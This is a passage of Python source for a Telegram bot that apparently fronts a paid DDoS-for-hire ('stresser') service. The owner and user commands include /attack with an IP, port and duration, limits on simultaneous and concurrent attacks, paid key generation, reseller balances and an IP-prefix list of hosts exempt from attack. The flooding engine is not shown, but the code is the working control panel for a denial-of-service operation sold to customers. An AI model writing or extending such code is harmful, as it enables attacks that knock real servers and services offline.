        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑴𝒂𝒙 𝒔𝒍𝒐𝒕𝒔 𝒔𝒆𝒕 𝒕𝒐 {value}!</b>\n\n𝑵𝒐𝒘 {value} 𝒂𝒕𝒕𝒂𝒄𝒌𝒔 𝒄𝒂𝒏 𝒓𝒖𝒏 𝒔𝒊𝒎𝒖𝒍𝒕𝒂𝒏𝒆𝒐𝒖𝒔𝒍𝒚.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒏𝒖𝒎𝒃𝒆𝒓!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

def set_concurrent_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑪𝒂𝒏𝒄𝒆𝒍𝒍𝒆𝒅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    try:
        value = int(message.text.strip())
        if value < 1:
            value = 1
        if value > 10:
            value = 10
        set_concurrent_limit(value)
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑪𝒐𝒏𝒄𝒖𝒓𝒓𝒆𝒏𝒕 𝒑𝒆𝒓 𝒂𝒕𝒕𝒂𝒄𝒌 𝒔𝒆𝒕 𝒕𝒐 {value}!</b>\n\n𝑬𝒂𝒄𝒉 𝑨𝑷𝑰 𝒄𝒂𝒍𝒍 𝒘𝒊𝒍𝒍 𝒖𝒔𝒆 {value} 𝒄𝒐𝒏𝒄𝒖𝒓𝒓𝒆𝒏𝒕 𝒄𝒐𝒏𝒏𝒆𝒄𝒕𝒊𝒐𝒏𝒔.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒏𝒖𝒎𝒃𝒆𝒓!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

def block_ip_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑪𝒂𝒏𝒄𝒆𝒍𝒍𝒆𝒅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    ip_prefix = message.text.strip()
    
    if add_blocked_ip(ip_prefix):
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑰𝑷 𝒑𝒓𝒆𝒇𝒊𝒙 <code>{ip_prefix}*</code> 𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒃𝒍𝒐𝒄𝒌𝒆𝒅!</b>\n\n𝑨𝒏𝒚 𝑰𝑷 𝒔𝒕𝒂𝒓𝒕𝒊𝒏𝒈 𝒘𝒊𝒕𝒉 {ip_prefix} 𝒄𝒂𝒏𝒏𝒐𝒕 𝒃𝒆 𝒂𝒕𝒕𝒂𝒄𝒌𝒆𝒅.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    else:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑭𝒂𝒊𝒍𝒆𝒅 𝒕𝒐 𝒃𝒍𝒐𝒄𝒌 𝑰𝑷!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

def unblock_ip_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑪𝒂𝒏𝒄𝒆𝒍𝒍𝒆𝒅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    ip_prefix = message.text.strip()
    
    if remove_blocked_ip(ip_prefix):
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑰𝑷 𝒑𝒓𝒆𝒇𝒊𝒙 <code>{ip_prefix}*</code> 𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒖𝒏𝒃𝒍𝒐𝒄𝒌𝒆𝒅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    else:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝑷 𝒑𝒓𝒆𝒇𝒊𝒙 <code>{ip_prefix}*</code> 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅 𝒊𝒏 𝒃𝒍𝒐𝒄𝒌𝒆𝒅 𝒍𝒊𝒔𝒕!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

# ============ CONVENIENCE COMMANDS (Duplicate) ============

@bot.message_handler(commands=["setconcurrent"])
def set_concurrent_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /setconcurrent &lt;value&gt;\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: /setconcurrent 4", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    try:
        value = int(command_parts[1])
        if value < 1:
            value = 1
        if value > 10:
            value = 10
        
        set_concurrent_limit(value)
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑪𝒐𝒏𝒄𝒖𝒓𝒓𝒆𝒏𝒕 𝒑𝒆𝒓 𝒂𝒕𝒕𝒂𝒄𝒌 𝒔𝒆𝒕 𝒕𝒐: {value}</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒏𝒖𝒎𝒃𝒆𝒓!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

@bot.message_handler(commands=["setgrp"])
def set_group_config_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(message, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /setgrp &lt;group_id&gt; &lt;setting&gt; &lt;value&gt;\n\n𝑺𝒆𝒕𝒕𝒊𝒏𝒈𝒔: max_time, cooldown, max_slots, feedback", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    group_id = command_parts[1]
    setting = command_parts[2].lower()
    
    try:
        value = int(command_parts[3])
    except:
        if setting == "feedback":
            value_str = command_parts[3].lower()
            if value_str == "on":
                set_group_feedback_required(group_id, True)
                bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑮𝒓𝒐𝒖𝒑 {group_id} 𝒇𝒆𝒆𝒅𝒃𝒂𝒄𝒌 𝒓𝒆𝒒𝒖𝒊𝒓𝒆𝒅 𝒔𝒆𝒕 𝒕𝒐 𝑶𝑵!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            elif value_str == "off":
                set_group_feedback_required(group_id, False)
                bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑮𝒓𝒐𝒖𝒑 {group_id} 𝒇𝒆𝒆𝒅𝒃𝒂𝒄𝒌 𝒓𝒆𝒒𝒖𝒊𝒓𝒆𝒅 𝒔𝒆𝒕 𝒕𝒐 𝑶𝑭𝑭!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            else:
                bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒗𝒂𝒍𝒖𝒆!</b> 𝑼𝒔𝒆 'on' 𝒐𝒓 'off' 𝒇𝒐𝒓 𝒇𝒆𝒆𝒅𝒃𝒂𝒄𝒌.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            return
        else:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒗𝒂𝒍𝒖𝒆!</b> 𝑴𝒖𝒔𝒕 𝒃𝒆 𝒂 𝒏𝒖𝒎𝒃𝒆𝒓.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            return
    
    if setting == "max_time":
        if value < MIN_ATTACK_TIME:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑴𝒂𝒙 𝒕𝒊𝒎𝒆 𝒎𝒖𝒔𝒕 𝒃𝒆 𝒂𝒕 𝒍𝒆𝒂𝒔𝒕 {MIN_ATTACK_TIME} 𝒔𝒆𝒄𝒐𝒏𝒅𝒔!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            return
        set_group_max_attack_time(group_id, value)
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑮𝒓𝒐𝒖𝒑 {group_id} 𝒎𝒂𝒙 𝒂𝒕𝒕𝒂𝒄𝒌 𝒕𝒊𝒎𝒆 𝒔𝒆𝒕 𝒕𝒐 {value} 𝒔𝒆𝒄𝒐𝒏𝒅𝒔!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        
    elif setting == "cooldown":
        if value < 0:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑪𝒐𝒐𝒍𝒅𝒐𝒘𝒏 𝒄𝒂𝒏𝒏𝒐𝒕 𝒃𝒆 𝒏𝒆𝒈𝒂𝒕𝒊𝒗𝒆!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            return
        set_group_cooldown_time(group_id, value)
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑮𝒓𝒐𝒖𝒑 {group_id} 𝒄𝒐𝒐𝒍𝒅𝒐𝒘𝒏 𝒔𝒆𝒕 𝒕𝒐 {value} 𝒔𝒆𝒄𝒐𝒏𝒅𝒔!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        
    elif setting == "max_slots":
        if value < 1 or value > 10:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑴𝒂𝒙 𝒔𝒍𝒐𝒕𝒔 𝒎𝒖𝒔𝒕 𝒃𝒆 𝒃𝒆𝒕𝒘𝒆𝒆𝒏 1 𝒂𝒏𝒅 10!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            return
        set_group_max_slots(group_id, value)
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑮𝒓𝒐𝒖𝒑 {group_id} 𝒎𝒂𝒙 𝒔𝒍𝒐𝒕𝒔 𝒔𝒆𝒕 𝒕𝒐 {value}!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        
    else:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒔𝒆𝒕𝒕𝒊𝒏𝒈!</b> 𝑼𝒔𝒆: max_time, cooldown, max_slots, feedback", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

@bot.message_handler(commands=["blockip"])
def block_ip_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /blockip &lt;ip_prefix&gt;\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: /blockip 20.204", reply_to=message)
        return
    
    ip_prefix = command_parts[1]
    
    if add_blocked_ip(ip_prefix):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑰𝑷 𝒑𝒓𝒆𝒇𝒊𝒙 <code>{ip_prefix}*</code> 𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒃𝒍𝒐𝒄𝒌𝒆𝒅!</b>", reply_to=message)
    else:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑭𝒂𝒊𝒍𝒆𝒅 𝒕𝒐 𝒃𝒍𝒐𝒄𝒌 𝑰𝑷!</b>", reply_to=message)

@bot.message_handler(commands=["unblockip"])
def unblock_ip_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /unblockip &lt;ip_prefix&gt;\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: /unblockip 20.204", reply_to=message)
        return
    
    ip_prefix = command_parts[1]
    
    if remove_blocked_ip(ip_prefix):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑰𝑷 𝒑𝒓𝒆𝒇𝒊𝒙 <code>{ip_prefix}*</code> 𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒖𝒏𝒃𝒍𝒐𝒄𝒌𝒆𝒅!</b>", reply_to=message)
    else:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑰𝑷 𝒑𝒓𝒆𝒇𝒊𝒙 <code>{ip_prefix}*</code> 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅 𝒊𝒏 𝒃𝒍𝒐𝒄𝒌𝒆𝒅 𝒍𝒊𝒔𝒕!</b>", reply_to=message)

@bot.message_handler(commands=["blockedips"])
def blocked_ips_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    blocked = get_all_blocked_ips()
    
    if not blocked:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.DOCUMENT} 𝑵𝒐 𝑰𝑷𝒔 𝒂𝒓𝒆 𝒄𝒖𝒓𝒓𝒆𝒏𝒕𝒍𝒚 𝒃𝒍𝒐𝒄𝒌𝒆𝒅!", reply_to=message)
        return
    
    response = f"{HTML_EMOJI.BAN} <b>𝑩𝑳𝑶𝑪𝑲𝑬𝑫 𝑰𝑷𝑺 𝑳𝑰𝑺𝑻</b>\n\n"
    for i, ip_data in enumerate(blocked, 1):
        response += f"{i}. <code>{ip_data['ip']}*</code>\n"
    
    response += f"\n{HTML_EMOJI.STATS} 𝑻𝒐𝒕𝒂𝒍 𝑩𝒍𝒐𝒄𝒌𝒆𝒅 𝑷𝒓𝒆𝒇𝒊𝒙𝒆𝒔: {len(blocked)}"
    
    safe_send_message(message.chat.id, response, reply_to=message)

@bot.message_handler(commands=["feedback_on"])
def feedback_on_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    set_setting('feedback_required', True)
    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑭𝒆𝒆𝒅𝒃𝒂𝒄𝒌 𝒓𝒆𝒒𝒖𝒊𝒓𝒆𝒎𝒆𝒏𝒕 𝑬𝑵𝑨𝑩𝑳𝑬𝑫!</b> 𝑼𝒔𝒆𝒓𝒔 𝒎𝒖𝒔𝒕 𝒔𝒆𝒏𝒅 𝒇𝒆𝒆𝒅𝒃𝒂𝒄𝒌 𝒂𝒇𝒕𝒆𝒓 𝒆𝒂𝒄𝒉 𝒂𝒕𝒕𝒂𝒄𝒌.", reply_to=message)

@bot.message_handler(commands=["feedback_off"])
def feedback_off_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    set_setting('feedback_required', False)
    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑭𝒆𝒆𝒅𝒃𝒂𝒄𝒌 𝒓𝒆𝒒𝒖𝒊𝒓𝒆𝒎𝒆𝒏𝒕 𝑫𝑰𝑺𝑨𝑩𝑳𝑬𝑫!</b> 𝑼𝒔𝒆𝒓𝒔 𝒄𝒂𝒏 𝒂𝒕𝒕𝒂𝒄𝒌 𝒘𝒊𝒕𝒉𝒐𝒖𝒕 𝒔𝒆𝒏𝒅𝒊𝒏𝒈 𝒇𝒆𝒆𝒅𝒃𝒂𝒄𝒌.", reply_to=message)
    
# ============ OWNER PANEL ============

@bot.message_handler(commands=["owner"])
def owner_settings_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        return
    
    help_text = f'''
{HTML_EMOJI.CROWN} <b>𝑶𝑾𝑵𝑬𝑹 𝑷𝑨𝑵𝑬𝑳</b>

𝑼𝒔𝒆 /config 𝒕𝒐 𝒐𝒑𝒆𝒏 𝒕𝒉𝒆 𝒊𝒏𝒕𝒆𝒓𝒂𝒄𝒕𝒊𝒗𝒆 𝒄𝒐𝒏𝒇𝒊𝒈𝒖𝒓𝒂𝒕𝒊𝒐𝒏 𝒑𝒂𝒏𝒆𝒍.

{HTML_EMOJI.DOCUMENT} <b>𝑸𝑼𝑰𝑪𝑲 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺:</b>

{HTML_EMOJI.BAN} <b>𝑰𝑷 𝑩𝑳𝑶𝑪𝑲𝑰𝑵𝑮:</b>
• /blockip &lt;prefix&gt; - 𝑩𝒍𝒐𝒄𝒌 𝑰𝑷 𝒑𝒓𝒆𝒇𝒊𝒙
• /unblockip &lt;prefix&gt; - 𝑼𝒏𝒃𝒍𝒐𝒄𝒌 𝑰𝑷 𝒑𝒓𝒆𝒇𝒊𝒙
• /blockedips - 𝑳𝒊𝒔𝒕 𝒂𝒍𝒍 𝒃𝒍𝒐𝒄𝒌𝒆𝒅 𝑰𝑷𝒔

{HTML_EMOJI.SETTINGS} <b>𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑬𝑻𝑻𝑰𝑵𝑮𝑺:</b>
• /setmaxslot &lt;slots&gt; - 𝑺𝒆𝒕 𝒎𝒂𝒙 𝒔𝒊𝒎𝒖𝒍𝒕𝒂𝒏𝒆𝒐𝒖𝒔 𝒂𝒕𝒕𝒂𝒄𝒌𝒔
• /setconcurrent &lt;value&gt; - 𝑺𝒆𝒕 𝒄𝒐𝒏𝒄𝒖𝒓𝒓𝒆𝒏𝒕 𝒑𝒆𝒓 𝒂𝒕𝒕𝒂𝒄𝒌
• /maxattack &lt;sec&gt; - 𝑺𝒆𝒕 𝒎𝒂𝒙 𝒕𝒊𝒎𝒆 𝒇𝒐𝒓 𝒏𝒐𝒓𝒎𝒂𝒍 𝒌𝒆𝒚𝒔
• /cooldown &lt;sec&gt; - 𝑺𝒆𝒕 𝒄𝒐𝒐𝒍𝒅𝒐𝒘𝒏

{HTML_EMOJI.KEY} <b>𝑲𝑬𝒀 𝑴𝑨𝑵𝑨𝑮𝑬𝑴𝑬𝑵𝑻:</b>
• /gen - 𝑮𝒆𝒏𝒆𝒓𝒂𝒕𝒆 𝒌𝒆𝒚𝒔 (𝒄𝒉𝒐𝒐𝒔𝒆 𝑽𝑰𝑷/𝑵𝑶𝑹𝑴𝑨𝑳)
• /key &lt;key&gt; - 𝑲𝒆𝒚 𝒅𝒆𝒕𝒂𝒊𝒍𝒔
• /allkeys - 𝑨𝒍𝒍 𝒌𝒆𝒚𝒔
• /delkey &lt;key&gt; - 𝑫𝒆𝒍𝒆𝒕𝒆 𝒌𝒆𝒚
• /delexpkey - 𝑫𝒆𝒍𝒆𝒕𝒆 𝒆𝒙𝒑𝒊𝒓𝒆𝒅 𝒌𝒆𝒚𝒔
• /trail &lt;hrs&gt; &lt;max&gt; - 𝑻𝒓𝒂𝒊𝒍 𝒌𝒆𝒚𝒔

{HTML_EMOJI.USERS} <b>𝑼𝑺𝑬𝑹 𝑴𝑨𝑵𝑨𝑮𝑬𝑴𝑬𝑵𝑻:</b>
• /allusers - 𝑨𝒍𝒍 𝒖𝒔𝒆𝒓𝒔
• /extend &lt;id&gt; &lt;time&gt; - 𝑬𝒙𝒕𝒆𝒏𝒅 𝒕𝒊𝒎𝒆
• /extendall &lt;time&gt; - 𝑬𝒙𝒕𝒆𝒏𝒅 𝒆𝒗𝒆𝒓𝒚𝒐𝒏𝒆'𝒔 𝒕𝒊𝒎𝒆
• /down &lt;id&gt; &lt;time&gt; - 𝑹𝒆𝒅𝒖𝒄𝒆 𝒕𝒊𝒎𝒆
• /ban &lt;id&gt; - 𝑩𝒂𝒏 𝒖𝒔𝒆𝒓
• /unban &lt;id&gt; - 𝑼𝒏𝒃𝒂𝒏 𝒖𝒔𝒆𝒓
• /tban &lt;id&gt; &lt;time&gt; - 𝑻𝒆𝒎𝒑 𝒃𝒂𝒏

{HTML_EMOJI.STORE} <b>𝑹𝑬𝑺𝑬𝑳𝑳𝑬𝑹 𝑴𝑨𝑵𝑨𝑮𝑬𝑴𝑬𝑵𝑻:</b>
• /addreseller &lt;id&gt; - 𝑨𝒅𝒅 𝒓𝒆𝒔𝒆𝒍𝒍𝒆𝒓
• /removereseller &lt;id&gt; - 𝑹𝒆𝒎𝒐𝒗𝒆 𝒓𝒆𝒔𝒆𝒍𝒍𝒆𝒓
• /blockreseller &lt;id&gt; - 𝑩𝒍𝒐𝒄𝒌
• /unblockreseller &lt;id&gt; - 𝑼𝒏𝒃𝒍𝒐𝒄𝒌
• /allresellers - 𝑨𝒍𝒍 𝒓𝒆𝒔𝒆𝒍𝒍𝒆𝒓𝒔
• /saldoadd &lt;id&gt; &lt;amt&gt; - 𝑨𝒅𝒅 𝒃𝒂𝒍𝒂𝒏𝒄𝒆
• /saldoremove &lt;id&gt; &lt;amt&gt; - 𝑹𝒆𝒎𝒐𝒗𝒆 𝒃𝒂𝒍𝒂𝒏𝒄𝒆
• /saldo &lt;id&gt; - 𝑪𝒉𝒆𝒄𝒌 𝒃𝒂𝒍𝒂𝒏𝒄𝒆

{HTML_EMOJI.USERS} <b>𝑮𝑹𝑶𝑼𝑷 𝑴𝑨𝑵𝑨𝑮𝑬𝑴𝑬𝑵𝑻:</b>
• /addgrp &lt;name&gt; &lt;group_id&gt; &lt;days&gt; - 𝑨𝒑𝒑𝒓𝒐𝒗𝒆 𝒈𝒓𝒐𝒖𝒑
• /delgrp &lt;name&gt; - 𝑹𝒆𝒎𝒐𝒗𝒆 𝒈𝒓𝒐𝒖𝒑 𝒂𝒑𝒑𝒓𝒐𝒗𝒂𝒍
• /grpinfo - 𝑳𝒊𝒔𝒕 𝒂𝒑𝒑𝒓𝒐𝒗𝒆𝒅 𝒈𝒓𝒐𝒖𝒑𝒔
• /setgrp &lt;group_id&gt; &lt;setting&gt; &lt;value&gt;

{HTML_EMOJI.MEGAPHONE} <b>𝑩𝑹𝑶𝑨𝑫𝑪𝑨𝑺𝑻:</b>
• /broadcast - 𝑴𝒆𝒔𝒔𝒂𝒈𝒆 𝒕𝒐 𝒂𝒍𝒍
• /broadcastreseller - 𝑴𝒆𝒔𝒔𝒂𝒈𝒆 𝒕𝒐 𝒓𝒆𝒔𝒆𝒍𝒍𝒆𝒓𝒔
• /broadcastpaid - 𝑴𝒆𝒔𝒔𝒂𝒈𝒆 𝒕𝒐 𝒑𝒂𝒊𝒅 𝒖𝒔𝒆𝒓𝒔 𝒐𝒏𝒍𝒚

{HTML_EMOJI.STATS} <b>𝑴𝑶𝑵𝑰𝑻𝑶𝑹𝑰𝑵𝑮:</b>
• /live - 𝑺𝒆𝒓𝒗𝒆𝒓 𝒔𝒕𝒂𝒕𝒔
• /logs - 𝑨𝒕𝒕𝒂𝒄𝒌 𝒍𝒐𝒈𝒔
• /dellogs - 𝑫𝒆𝒍𝒆𝒕𝒆 𝒂𝒍𝒍 𝒍𝒐𝒈𝒔
• /ping - 𝑺𝒉𝒐𝒘 𝒃𝒐𝒕 𝒍𝒂𝒕𝒆𝒏𝒄𝒚

{HTML_EMOJI.SETTINGS} <b>𝑴𝑨𝑰𝑵𝑻𝑬𝑵𝑨𝑵𝑪𝑬:</b>
• /maintenance &lt;msg&gt; - 𝑴𝒂𝒊𝒏𝒕𝒆𝒏𝒂𝒏𝒄𝒆 𝑶𝑵
• /ok - 𝑴𝒂𝒊𝒏𝒕𝒆𝒏𝒂𝒏𝒄𝒆 𝑶𝑭𝑭
'''
    
    safe_send_message(message.chat.id, help_text, reply_to=message)

# ============ HELP COMMAND ============

@bot.message_handler(commands=['help'])
def show_help(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    if is_owner(user_id):
        help_text = f'''
{HTML_EMOJI.CROWN} <b>𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑶𝒘𝒏𝒆𝒓!</b>

• 𝑼𝒔𝒆 /owner 𝒕𝒐 𝒔𝒆𝒆 𝒂𝒍𝒍 𝒄𝒐𝒎𝒎𝒂𝒏𝒅𝒔 𝒐𝒓 /config 𝒇𝒐𝒓 𝒊𝒏𝒕𝒆𝒓𝒂𝒄𝒕𝒊𝒗𝒆 𝒑𝒂𝒏𝒆𝒍.

{HTML_EMOJI.FIRE} <b>𝑩𝒂𝒔𝒊𝒄 𝒄𝒐𝒎𝒎𝒂𝒏𝒅𝒔:</b>
{HTML_EMOJI.ARROW_RIGHT} /attack &lt;ip&gt; &lt;port&gt; &lt;duration&gt; - 𝑳𝒂𝒖𝒏𝒄𝒉 𝒂𝒕𝒕𝒂𝒄𝒌
{HTML_EMOJI.ARROW_RIGHT} /status - 𝑪𝒉𝒆𝒄𝒌 𝒂𝒕𝒕𝒂𝒄𝒌 𝒔𝒕𝒂𝒕𝒖𝒔
{HTML_EMOJI.ARROW_RIGHT} /cancel - 𝑪𝒂𝒏𝒄𝒆𝒍 𝒂𝒄𝒕𝒊𝒗𝒆 𝒂𝒕𝒕𝒂𝒄𝒌
{HTML_EMOJI.ARROW_RIGHT} /redeem &lt;key&gt; - 𝑹𝒆𝒅𝒆𝒆𝒎 𝒂 𝒌𝒆𝒚
{HTML_EMOJI.ARROW_RIGHT} /myaccess - 𝑪𝒉𝒆𝒄𝒌 𝒚𝒐𝒖𝒓 𝒂𝒄𝒄𝒆𝒔𝒔
{HTML_EMOJI.ARROW_RIGHT} /id - 𝑮𝒆𝒕 𝒚𝒐𝒖𝒓 𝑰𝑫
{HTML_EMOJI.ARROW_RIGHT} /ping - 𝑺𝒉𝒐𝒘 𝒃𝒐𝒕 𝒍𝒂𝒕𝒆𝒏𝒄𝒚
'''
    elif is_reseller(user_id):
        help_text = f'''
{HTML_EMOJI.STORE} <b>𝑹𝑬𝑺𝑬𝑳𝑳𝑬𝑹 𝑷𝑨𝑵𝑬𝑳</b>

{HTML_EMOJI.FIRE} <b>𝑪𝒐𝒎𝒎𝒂𝒏𝒅𝒔:</b>
{HTML_EMOJI.ARROW_RIGHT} /attack &lt;ip&gt; &lt;port&gt; &lt;duration&gt; - 𝑳𝒂𝒖𝒏𝒄𝒉 𝒂𝒕𝒕𝒂𝒄𝒌
{HTML_EMOJI.ARROW_RIGHT} /redeem &lt;key&gt; - 𝑹𝒆𝒅𝒆𝒆𝒎 𝒂 𝒌𝒆𝒚
{HTML_EMOJI.ARROW_RIGHT} /status - 𝑪𝒉𝒆𝒄𝒌 𝒂𝒕𝒕𝒂𝒄𝒌 𝒔𝒕𝒂𝒕𝒖𝒔
{HTML_EMOJI.ARROW_RIGHT} /cancel - 𝑪𝒂𝒏𝒄𝒆𝒍 𝒂𝒄𝒕𝒊𝒗𝒆 𝒂𝒕𝒕𝒂𝒄𝒌
